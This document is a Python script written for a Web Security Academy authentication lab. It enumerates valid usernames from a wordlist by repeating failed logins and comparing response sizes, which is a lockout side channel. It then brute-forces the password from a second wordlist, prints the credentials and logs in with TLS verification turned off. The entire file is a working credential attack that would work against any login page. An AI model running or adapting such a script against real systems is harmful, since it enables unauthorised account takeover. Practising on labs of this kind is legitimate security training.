#!/usr/bin/env python3 

from site import USER_SITE
import requests
import urllib3
import argparse
import sys
import subprocess
import time
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 

First download auth-lab-usernames and auth-lab-passwords in the same folder as the script and rename them to usernames.txt and passwords.txt respectively
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url

def user_enum(url):
    global username, login_path
    login_path = '/login'
    with open('usernames.txt') as f:
        users = f.readlines()
    a = []
    for i, value in enumerate(users):
        for j in range(5):
            data = {
                "username": str(value.strip('\n')),
                "password": "test"
            }
            r = requests.post(url + login_path, verify=False, data=data)
            a.append(str(len(r.content)))
    el = a.index(max(a))
    el_div = el // 5
    username = users[el_div].strip('\n')
    return username

def user_pass(url, username):
    with open('passwords.txt') as g:
        pwd = g.readlines()
    b = []
    for j, value in enumerate(pwd):
        data = {
            "username": username,
            "password": str(value.strip('\n'))
        }
        r = requests.post(url + login_path, verify=False, data=data, allow_redirects=False)
        b.append(str(len(r.content)))
    min_len = b.index(min(b))
    password = pwd[min_len].strip('\n')
    data1 = {
        "username": username,
        "password": password
    }
    print("(+) The valid credentials are: " + username + ":" + password)
    time.sleep(60)
    requests.post(url + login_path, verify=False, data=data1)
    subprocess.call(["firefox", url])
    sys.exit("(+) Username Enumeration Successful!")
    
def main():
    
    print("(+) Exploiting Username Enumeration")
        
    user_enum(url)

    user_pass(url, username)

if __name__ == "__main__":
    main()
